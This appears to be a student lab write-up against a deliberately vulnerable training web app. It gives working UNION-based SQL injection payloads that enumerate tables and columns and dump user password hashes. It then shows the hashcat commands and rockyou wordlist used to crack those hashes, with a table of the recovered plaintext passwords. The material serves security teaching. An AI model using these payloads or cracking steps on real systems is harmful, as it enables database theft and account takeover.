# 2. SQL Injection

## 2.1. Basic Injection

When we change the ID parameter of the URL, it does the same thing as when we use the input field, the submission is done and we have the result

## 2.2. Always true scenario

When we put the following command in the field : 

```
%' or 0=0 union select null, version() #
```

The query is executed and the following result is obtained:

<img title="version of the database" alt="version of the database" src="/src/2.2_new.png">

We conclude that the database version is 10.1.26 of MariaDB

## 2.3 Exercises

### 2.3.1. Print the database user

To be able to select the important information of the users, we follow the following steps: 

- Look at the names of the tables to identify the users

To see the tables, we used the following command

```
%' or 0=0 union select table_name, null from information_schema.tables #"
```

the following result is obtained:

<img title="tables of the database" alt="ables of the database" src="/src/2.3.1_0.png">

So the name of the users table is users.
There are other tables of course but we just stopped the capture at this level for readability reasons 

- Identify important columns

We used the following command to find the columns of the users table.

```
%' or 0=0 union select column_name, null from information_schema.columns where table_name = 'users' 
```

Here is the result

<img title="Columns of the users table" alt="Columns of the users table" src="/src/2.3.1_1.png">

We see on this picture all the columns (highlighted in yellow) of the table.

- Select user data on the fields we are interested in 

We have chosen to retrieve the following fields: user_id, user, first_name, last_name, last_login, password.

Here is the query used 

```
%' or 0=0 union select 'user_id|user|first_name|last_name|last_login|password)', concat(user_id,'|',user, '|', first_name, '|', last_name, '|', last_login, '|', password) from users #
```

And here is the result

<img title="Retrieve of columns" alt="Retrieve of columns" src="/src/2.3.1_2.png">

The value of the First Name field displayed is just to help us find the value of the Surname field

### 2.3.2. Print the database name

To find the name of the database, we used this query: 

```
%' or 0=0 union select null, database() #
```

This gives as an answer: 

<img title="Database name" alt="Database name" src="/src/2.3.2.png">

### 2.2.3. Print the name of all of the tables in the database

The query to do this is as follows: 

```
%' or 0=0 union select table_name, null from information_schema.tables #
```

We also used it in answer 1.

Below is the result

<img title="All tables name" alt="All tables name" src="/src/2.3.3.png">

### 2.2.4. Print the names of all of the columns in the users table

We have already done so in answer 2.2.2 and here is the query we used

```
%' or 0=0 union select column_name, null from information_schema.columns where table_name = 'users' # 
```

### 2.2.5. Now that we have the column names, print out the usernames and hashed passwords for each user !

We used this query to get the usernames and passwords of the users 

```
%' or 0=0 union select 'first_name|last_name|password)', concat(first_name, '|', last_name, "|", password) from users #
```

Result:

<img title="Usernames and passwords of the users" alt="Usernames and passwords of the users" src="/src/2.3.5.png">

the logic of the output is the same as the answer 2.2.2

# 3. Cracking hashed passwords with hashcat

To crack the passwords, we followed the following steps

### 3.1. Create a file with hashed passwords

We used the following echo command to create the file 

```
echo -e "5f4dcc3b5aa765d61d8327deb882cf99\ne99a18c428cb38d5f260853678922e03\n8d3533d75ae2c3966d7e0d4fcc69216b\n0d107d09f5bbe40cade3de5c71e9e9b7\n5f4dcc3b5aa765d61d8327deb882cf99" >> target_hashes.txt
```

Here is what it looks like when displayed

<img title="Display hashed file" alt="Display hashed file" src="/src/3.2.png">

### 3.2. Decompression of the rockyou word list

The decompression was performed with the following command

```
gunzip /usr/share/wordlists/rockyou.txt.gz
```

The result

<img title="Display wordlist" alt="Display wordlist" src="/src/3.0.png">

### 3.3. Password cracking with MD5

Here is the command used

```
hashcat -m 0 -a 0 -o cracked.txt target_hashes.txt /usr/share/wordlists/rockyou.txt
```

Here is what you get after cracking

<img title="Display cracked file" alt="Display cracked file" src="/src/3.4.png">

We notice that we had 5 hashes and we have 4 results, this is explained by the fact that there are two identical hashes, so the same password.

### 3.4. Real password

Here is the final result with the users and their passwords in clear

| Id | Username | First Name | Last Name | Real Password | Hased password
|---|---|---|---|---|---|
| 1 | admin | admin | admin | password | 5f4dcc3b5aa765d61d8327deb882cf99
| 2 | gordonb | Gordon | Brown | abc123 | e99a18c428cb38d5f260853678922e03
| 3 | 1337 | Hack | Me | charley | 8d3533d75ae2c3966d7e0d4fcc69216b
| 4 | pablo | Pablo | Picasso | letmein | 0d107d09f5bbe40cade3de5c71e9e9b7
| 5 | smithy | Bob | Smith | password | 5f4dcc3b5aa765d61d8327deb882cf99
